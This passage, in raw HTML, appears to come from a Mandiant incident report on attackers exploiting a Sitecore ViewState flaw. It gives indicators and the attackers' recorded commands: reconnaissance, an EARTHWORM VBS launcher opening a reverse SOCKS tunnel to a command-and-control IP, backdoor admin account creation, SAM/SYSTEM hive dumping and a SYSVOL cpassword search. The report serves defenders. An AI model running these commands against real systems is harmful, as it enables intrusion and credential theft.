Information.GetDiskInformation(),\n\tNetworkAdapterInformation = Information.GetNetworkAdapterInformation(),\n\tProcess = Information.GetProcessInformation()\n};\n// Serialize the 'basicsInfo' object into a JSON string\nJavaScriptSerializer javaScriptSerializer = new JavaScriptSerializer();\ntext = javaScriptSerializer.Serialize(basicsInfo);</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Code snippet illustrating WEEPSTELL malware collection functionality</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">WEEPSTEEL appears to borrow some functionality from </span><a href=\"https://github.com/Ridter/cve-2020-0688/blob/master/ExchangeCmdPy.py\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">ExchangeCmdPy.py</span></a><span style=\"vertical-align: baseline;\">, a public tool tailored for similar ViewState-related intrusions. This comparison was originally noted in </span><a href=\"https://securelist.com/ghostcontainer/116953/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Kaspersky’s write-up</span></a><span style=\"vertical-align: baseline;\"> on the GhostContainer backdoor. Like </span><span style=\"vertical-align: baseline;\">ExchangeCmdPy</span><span style=\"vertical-align: baseline;\">, </span><span style=\"vertical-align: baseline;\">WEEPSTEEL</span><span style=\"vertical-align: baseline;\"> sends its output through a hidden HTML field masquerading as a legitimate </span><code style=\"vertical-align: baseline;\">__VIEWSTATE</code><span style=\"vertical-align: baseline;\"> parameter, shown as follows:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>&lt;input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" \nvalue=\"/wEPDwUKLTcyODc4{AES encrypted + base64 encoded output}\" /&gt;</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Subsequent HTTP POST requests to the </span><code style=\"vertical-align: baseline;\">blocked.aspx</code><span style=\"vertical-align: baseline;\"> endpoint from the threat actor would result in HTTP 200 \"OK\" responses, which Mandiant assesses would have contained an output in the aforementioned format. As the threat actor continued their hands-on interaction with the server, Mandiant observed repeated HTTP POST requests with successful responses to the </span><code style=\"vertical-align: baseline;\">blocked.aspx</code><span style=\"vertical-align: baseline;\"> endpoint.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Establish Foothold</span></h3>\n<p><span style=\"vertical-align: baseline;\">Following successful exploitation, the threat actor gained the </span><code style=\"vertical-align: baseline;\">NETWORK SERVICE</code><span style=\"vertical-align: baseline;\"> privilege, equivalent to the IIS worker process </span><code><span style=\"vertical-align: baseline;\">w3wp.exe</span></code><span style=\"vertical-align: baseline;\">. This access provided the actor a starting point for further malicious activities.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Config Extraction</span></h4>\n<p><span style=\"vertical-align: baseline;\">The threat actor then exfiltrated critical configuration files by archiving the contents of</span> <code style=\"vertical-align: baseline;\">\\inetpub\\sitecore\\SitecoreCD\\Website</code><span style=\"vertical-align: baseline;\">, a Sitecore Content Delivery (CD) instance's web root. This directory contained sensitive files, such as the </span><span style=\"vertical-align: baseline;\">web.config</span><span style=\"vertical-align: baseline;\"> file, that provide sensitive information about the application's backend and its dependencies, which would help enable post-exploitation activities.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Host Reconnaissance</span></h4>\n<p><span style=\"vertical-align: baseline;\">After obtaining the key server configuration files, the threat actor proceeded to fingerprint the compromised server through host and network reconnaissance, including but not limited to enumerating running processes, services, user accounts, TCP/IP configurations, and active network connections.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>whoami\nhostname\nnet user\ntasklist\nipconfig /all\ntasklist /svc\nnetstat -ano\nnslookup &lt;domain&gt;\nnet group domain admins\nnet localgroup administrators</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Staging Directory </span></h4>\n<p><span style=\"vertical-align: baseline;\">The threat actor leveraged public directories such as </span><code style=\"vertical-align: baseline;\">Music</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">Video</code><span style=\"vertical-align: baseline;\"> for staging and deploying their tooling. Files written into the Public directory include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>File:</strong> </span><span style=\"vertical-align: baseline;\">C:\\Users\\Public\\Music\\7za.exe</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Description:</strong> command-line executable for the 7-Zip file archiver</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>SHA-256:</strong> 223b873c50380fe9a39f1a22b6abf8d46db506e1c08d08312902f6f3cd1f7ac3</span></p>\n</li>\n</ul>\n<p> </p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>File:</strong> </span><span style=\"vertical-align: baseline;\">C:\\Users\\Public\\Music\\lfe.ico</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Description:</strong> An open-source network tunnel tool with SOCKS v5 server, tracked as </span><code style=\"vertical-align: baseline;\">EARTHWORM</code></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>SHA-256:</strong> b3f83721f24f7ee5eb19f24747b7668ff96da7dfd9be947e6e24a688ecc0a52b</span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 70%; margin-left: auto; margin-right: auto;\">\n<tbody>\n<tr>\n<td style=\"width: 100%;\">\n<p><strong><span style=\"vertical-align: baseline;\">About EARTHWORM</span></strong></p>\n<p><code style=\"vertical-align: baseline;\">EARTHWORM</code><span style=\"vertical-align: baseline;\"> is an open-source tunneler that allows attackers to create a covert channel to and from a victim system over a separate protocol to avoid detection and network filtering, or to enable access to otherwise unreachable systems.</span></p>\n<p><span style=\"vertical-align: baseline;\">During our investigation, </span><code style=\"vertical-align: baseline;\">EARTHWORM</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">was executed to initiate a reverse SOCKS proxy connection back to the following command-and-control (C2) server: </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">130.33.156[.]194</code><span style=\"vertical-align: baseline;\">:</span><code style=\"vertical-align: baseline;\">443</code></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">103.235.46[.]102</code><span style=\"vertical-align: baseline;\">:</span><code style=\"vertical-align: baseline;\">80</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n</ul>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>File:</strong> </span><span style=\"vertical-align: baseline;\">C:\\Users\\Public\\Music\\1.vbs</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Description:</strong> Attack VBScript: Used to execute threat actor commands, its content varies based on the desired actions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>SHA-256:</strong> &lt;hash varies&gt; </span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 70%; margin-left: auto; margin-right: auto;\">\n<tbody>\n<tr>\n<td style=\"width: 100%;\">\n<p><span style=\"vertical-align: baseline;\">In one instance where the file </span><span style=\"vertical-align: baseline;\">1.vbs</span><span style=\"vertical-align: baseline;\"> was retrieved, it contained a simple VBS code to launch the </span><code style=\"vertical-align: baseline;\">EARTHWORM</code><span style=\"vertical-align: baseline;\">.</span></p>\n<p> </p>\n<pre class=\"language-plain\"><code>Set shell = CreateObject(\"WScript.Shell\")\nshell.CurrentDirectory = \"C:\\Users\\Public\\Music\"\nshell.Run \"ufp.exe -s rssocks -d 130.33.156[.]194 \n-e 443\", 1, False</code></pre>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Escalate Privileges</span></h3>\n<p><span style=\"vertical-align: baseline;\">Following initial compromise, the threat actor elevated their access from </span><code style=\"vertical-align: baseline;\">NETWORK SERVICE</code><span style=\"vertical-align: baseline;\"> privileges to the </span><code style=\"vertical-align: baseline;\">SYSTEM</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">ADMINISTRATOR</code><span style=\"vertical-align: baseline;\"> level.</span></p>\n<p><span style=\"vertical-align: baseline;\">This involved creating local administrator accounts and obtaining access to domain administrator accounts. The threat actor was observed using additional tools to escalate privileges.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Adding Local Administrators</span></h4>\n<ul>\n<li><code style=\"vertical-align: baseline;\">asp$</code><span style=\"vertical-align: baseline;\">: The threat actor leveraged a privilege escalation tool to create the local administrator account, </span><code style=\"vertical-align: baseline;\">asp$</code><span style=\"vertical-align: baseline;\">. The naming convention mimicking an ASP.NET service account with a common suffix $ suggests an attempt to blend in and evade detection.</span></li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>\"C:\\Users\\Public\\Music\\helper.exe\" \"net user asp$ {REDACTED} /add\"\n\"C:\\Users\\Public\\Music\\helper.exe\" \"net localgroup administrators asp$ /add\"</code></pre></div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li><code style=\"vertical-align: baseline;\">sawadmin</code><span style=\"vertical-align: baseline;\">: At a later stage, the threat actor established a </span><code style=\"vertical-align: baseline;\">DWAGENT</code><span style=\"vertical-align: baseline;\"> remote session to create a second local administrator account. </span></li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>net  user sawadmin {REDACTED} /add\nnet  localgroup administrators sawadmin /add</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Process Token Theft Attempt</span></h4>\n<p><span style=\"vertical-align: baseline;\">The threat actor was observed executing a binary named</span><code style=\"vertical-align: baseline;\"> GoToken.exe</code><span style=\"vertical-align: baseline;\"> under the context of </span><code style=\"vertical-align: baseline;\">sawadmin</code><span style=\"vertical-align: baseline;\"> with the following command-line arguments:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>GoToken.exe  -h\nGoToken.exe  -l\nGoToken.exe  -ah\nGoToken.exe  -t</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">While Mandiant was unable to recover the </span><code style=\"vertical-align: baseline;\">GoToken.exe</code><span style=\"vertical-align: baseline;\"> binary from the server, the filename and arguments strongly suggest it is the public Go-based token-stealing tool </span><a href=\"https://github.com/Aquilao/GoTokenTheft\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GoTokenTheft</span></a><span style=\"vertical-align: baseline;\">. This tool is designed to execute commands using the security context of other users on a system.</span></p>\n<p><span style=\"vertical-align: baseline;\">Based on the tool’s available source code, the attacker attempted the following actions:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">h</code><span style=\"vertical-align: baseline;\">: view the tool's help menu</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">l</code><span style=\"vertical-align: baseline;\">: list all running processes and their associated user tokens to identify targets for impersonation</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">ah</code><span style=\"vertical-align: baseline;\">: execute commands using the tokens of users, excluding system accounts</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">t</code><span style=\"vertical-align: baseline;\">: </span><span style=\"vertical-align: baseline;\">list all unique user tokens active on the system</span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Credential Dumping</span></h4>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">The threat actor established </span><code style=\"vertical-align: baseline;\">RDP</code><span style=\"vertical-align: baseline;\"> access to the host using the two newly created accounts and proceeded to dump the </span><code style=\"vertical-align: baseline;\">SYSTEM</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">SAM</code><span style=\"vertical-align: baseline;\"> registry hives from both accounts. While redundant, this gave the attacker the information necessary to extract password hashes of local user accounts on the system. The activities associated with each account are as follows</span>:</span></p>\n<ul>\n<li><code style=\"vertical-align: baseline;\">asp$</code></li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>reg  save HKLM\\SYSTEM c:\\users\\public\\system.hive\nreg  save HKLM\\SAM c:\\users\\public\\sam.hive</code></pre></div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li><code style=\"vertical-align: baseline;\">sawadmin</code></li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>reg  save HKLM\\SYSTEM SYSTEM.hiv\nreg  save HKLM\\SAM SAM.hiv</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Maintain Presence</span></h3>\n<p><span style=\"vertical-align: baseline;\">The threat actor maintained persistence through a combination of methods, leveraging both created and compromised administrator credentials for </span><code style=\"vertical-align: baseline;\">RDP</code><span style=\"vertical-align: baseline;\"> access. <span style=\"vertical-align: baseline;\">Additionally, </span><span style=\"vertical-align: baseline;\">the threat actor issued commands to maintain long-term access to accounts. This included modifying settings to disable password expiration for administrative accounts of interest:</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>net  user &lt;AdminUser&gt; /passwordchg:no /expires:never\nwmic  useraccount where name='&lt;AdminUser&gt;' set PasswordExpires=False</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\"> For redundancy and continued remote access, the </span><code><span style=\"vertical-align: baseline;\">DWAGENT</span></code><span style=\"vertical-align: baseline;\"> tool was also installed.</span></span></p>\n<h4><span style=\"vertical-align: baseline;\">Remote Desktop Protocol </span></h4>\n<p><span style=\"vertical-align: baseline;\">The actor used the Remote Desktop Protocol extensively. The traffic was routed through a reverse SOCKS proxy created by </span><code style=\"vertical-align: baseline;\">EARTHWORM</code><span style=\"vertical-align: baseline;\"> to bypass security controls and obscure their activities. In one  </span><code style=\"vertical-align: baseline;\">RDP</code><span style=\"vertical-align: baseline;\"> session, the threat actor under the context of the account </span><span style=\"vertical-align: baseline;\"><code>asp$</code> </span><span style=\"vertical-align: baseline;\">downloaded additional attacker tooling, </span><code style=\"vertical-align: baseline;\">dwagent.exe</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">main.exe</code><span style=\"vertical-align: baseline;\">, into </span><code style=\"vertical-align: baseline;\">C:\\Users\\asp$\\Downloads</code><span style=\"vertical-align: baseline;\">. </span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">File Path</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">MD5</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Users\\asp$\\Downloads\\dwagent.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">n/a</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DWAgent installer</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Users\\asp$\\Downloads\\main.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">be7e2c6a9a4654b51a16f8b10a2be175</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Downloaded from hxxp://130.33.156[.]194/main.exe</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div align=\"left\" style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 1: <span style=\"vertical-align: baseline;\">Files written in the RDP session</span></span></div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Remote Access Tool: DWAGENT</span></h4>\n<p><code style=\"vertical-align: baseline;\">DWAGENT</code><span style=\"vertical-align: baseline;\"> is a legitimate remote access tool that enables remote control over the host. </span><code style=\"vertical-align: baseline;\">DWAGENT</code><span style=\"vertical-align: baseline;\"> operates as a service with </span><code style=\"vertical-align: baseline;\">SYSTEM</code><span style=\"vertical-align: baseline;\"> privilege and starts automatically, ensuring elevated and persistence access. During the </span><code style=\"vertical-align: baseline;\">DWAGENT</code><span style=\"vertical-align: baseline;\"> remote session, the attacker wrote the file </span><code style=\"vertical-align: baseline;\">GoToken.exe</code><span style=\"vertical-align: baseline;\">. The commands executed suggest that the tool was used to aid in extracting the registry hives.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">File Path</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">MD5</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Users\\Public\\Music\\GoToken.exe</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">62483e732553c8ba051b792949f3c6d0</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Binary executed prior to dumping of SAM/SYSTEM hives.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 2: <span style=\"vertical-align: baseline;\">File written in the DWAgent remote session</span></span></p>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Internal Reconnaissance</span></h3>\n<h4><span style=\"vertical-align: baseline;\">Active Directory Reconnaissance</span></h4>\n<p><span style=\"vertical-align: baseline;\">During a DWAGENT remote session, the threat actor executed commands to identify Domain Controllers within the target network. The actor then accessed the SYSVOL share on these identified DCs to search for </span><code style=\"vertical-align: baseline;\">cpassword</code><span style=\"vertical-align: baseline;\"> within Group Policy Object (GPO) XML files. This is a well-known technique attackers employ to discover privileged credentials mistakenly stored in a weakly encrypted format within the domain</span>.</p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>nltest  /DCLIST:&lt;domain&gt;\nnslookup   &lt;domain-controller&gt;\nfindstr  /S /l cpassword \n\\\\&lt;domain-controller&gt;\\sysvol\\dcext.local\\policies\\*.xml</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">SHARPHOUND</span></h4>\n<p><span style=\"vertical-align: baseline;\">The threat actor then transitioned to a new </span><code style=\"vertical-align: baseline;\">RDP</code><span 